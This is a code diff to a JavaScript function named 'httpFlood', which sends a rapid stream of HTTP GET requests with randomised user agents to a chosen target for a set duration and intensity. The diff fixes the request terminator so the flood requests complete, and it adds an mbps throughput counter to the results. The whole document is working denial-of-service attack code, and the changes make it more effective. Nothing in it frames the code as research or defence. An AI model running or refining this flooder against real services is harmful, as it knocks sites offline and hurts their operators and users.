@@ -3,7 +3,7 @@ async function httpFlood(target, duration, intensity) {
     const url = new URL(target);
     const host = url.hostname;
     const path = url.pathname || '/';
-    const port = url.port || (url.protocol === 'https:' ? 443 : 80);
+    const port = url.port || (url.protocol === 'https:' ? (url.protocol === 'wss:' ? 443 : 443) : 80);
     const protocol = url.protocol === 'https:' ? 'https' : 'http';
     const startTime = Date.now();
     const interval = Math.max(1, 50 / intensity);
@@ -17,6 +17,7 @@ async function httpFlood(target, duration, intensity) {
 
     let packetsSent = 0;
     let targetStatus = 'Online';
+    let mbps = 0;
 
     while (Date.now() - startTime < duration * 1000) {
       for (let i = 0; i < intensity; i++) {
@@ -25,9 +26,10 @@ async function httpFlood(target, duration, intensity) {
 
           socket.onopen = () => {
             const userAgent = userAgents[Math.floor(Math.random() * userAgents.length)];
-            const payload = `GET ${path} HTTP/1.1\r\nHost: ${host}\r\nUser-Agent: ${userAgent}\r\nAccept: */*\r\nConnection: keep-alive\r\n`;
+            const payload = `GET ${path} HTTP/1.1\r\nHost: ${host}\r\nUser-Agent: ${userAgent}\r\nAccept: */*\r\nConnection: keep-alive\r\n\r\n`;
             socket.send(payload);
             packetsSent++;
+            mbps += payload.length / 1000000 * 8;
           };
 
           socket.onerror = (error) => {
@@ -44,11 +46,12 @@ async function httpFlood(target, duration, intensity) {
       await new Promise(resolve => setTimeout(resolve, interval));
     }
 
-    return { packetsSent, targetStatus };
+    mbps = mbps / duration;
+    return { packetsSent, targetStatus, mbps };
 
   } catch (error) {
     console.error("Error in httpFlood:", error);
-    return { packetsSent: 0, targetStatus: 'Offline' };
+    return { packetsSent: 0, targetStatus: 'Offline', mbps: 0 };
   }
 }
 
